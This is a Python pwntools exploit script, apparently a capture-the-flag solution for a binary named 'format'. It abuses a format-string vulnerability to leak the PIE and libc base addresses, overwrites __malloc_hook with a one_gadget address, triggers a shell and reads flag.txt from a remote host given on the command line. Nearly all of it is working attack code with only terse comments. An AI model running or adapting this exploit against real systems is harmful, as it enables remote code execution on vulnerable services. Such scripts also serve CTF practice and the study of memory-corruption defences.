#!/usr/bin/env python3

from pwn import *
import sys

context.arch = "amd64"

def exploit(io, elf, libc):
    # leak pie base
    payload = b"%37$lx"
    io.sendline(payload)
    leak = int(io.recvline().strip().decode(), 16)
    main = leak + 0x17
    elf.address = main - elf.symbols["main"]
    print("PIE base: ", hex(elf.address))
    
    # leak libc address
    io.sendline(b'%7$s'.ljust(8, b'\x00') + p64(elf.got["fgets"]))
    fgets = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = fgets - libc.symbols["fgets"]
    print("libc base: ", hex(libc.address)) 
   
    # trigger malloc hook
    one_gadget = libc.address + 0x4f322
    fmt = fmtstr_payload(6, {libc.symbols["__malloc_hook"] : one_gadget})
    io.sendline(fmt)
    io.sendline(b"%99999")
    io.clean()
    
    io.sendline(b"cat flag.txt")
    flag = io.recv().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./format")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT) 
    
    elf = ELF("./format")
    libc = ELF("./libc.so.6")
    exploit(io, elf, libc)


if __name__ == "__main__":
    main()
